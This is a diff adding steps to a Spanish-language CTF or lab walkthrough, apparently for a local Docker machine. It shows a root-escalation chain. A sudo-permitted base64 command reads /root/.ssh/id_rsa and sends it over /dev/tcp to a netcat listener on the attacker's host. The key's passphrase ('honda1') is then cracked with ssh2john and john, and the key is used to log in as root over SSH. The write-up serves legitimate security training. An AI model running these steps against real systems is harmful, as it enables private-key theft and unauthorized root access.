@@ -83,5 +83,48 @@ nc -lvnp 4444
 <img width="752" height="796" alt="image" src="https://github.com/user-attachments/assets/6fa27d99-77ea-498e-8c24-1a25af9c5a36" />
 
 
-**4.4 **
+**4.4 Ahora abro otra terminal y meto en el nano id_rsa_root todo el hash y le doy permisos**
+```bash
+nano id_rsa_root
+chmod 600 id_rsa_root
+```
+
+<img width="718" height="55" alt="image" src="https://github.com/user-attachments/assets/3c128dee-afdc-4e8e-8a16-d51267b74462" />
+
+
+**4.5 Ahora en esa terminal empezamos a escucha con 445**
+```bash
+nc -lvnp 4445 > id_rsa_root
+```
+
+**4.6 Volveremos por un momento a el equipo de verde a ejecutar la codificación.**
+```bash
+sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 --decode > /dev/tcp/172.17.0.1/4445
+```
+
+<img width="742" height="72" alt="image" src="https://github.com/user-attachments/assets/fc885298-3b8e-4c2b-961e-b53e7f2bcfcd" />
+
+
+
+**4.7 En la terminal de tu equipo ejecutaremos el ssh2john**
+```bash
+chmod 600 id_rsa_root
+ssh2john id_rsa_root > hash_root.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash_root.txt
+```
+
+<img width="767" height="274" alt="image" src="https://github.com/user-attachments/assets/651d6a70-615f-4e83-a021-5c5bad2ee768" />
+
+
+**4.8 Ya sabiendo que la contraseña de root es `honda1` accederemos por ssh.**
+```bash
+ ssh -i id_rsa_root root@172.17.0.2
+```
+
+<img width="751" height="591" alt="image" src="https://github.com/user-attachments/assets/b5b7292a-01ea-4bb2-8a6a-18d9fba654f2" />
+
+
+**Confirmamos que no hay ninguna bandera en root.**
+
+<img width="756" height="196" alt="image" src="https://github.com/user-attachments/assets/897fb777-ba94-48cb-a8de-203186c92f5b" />
 
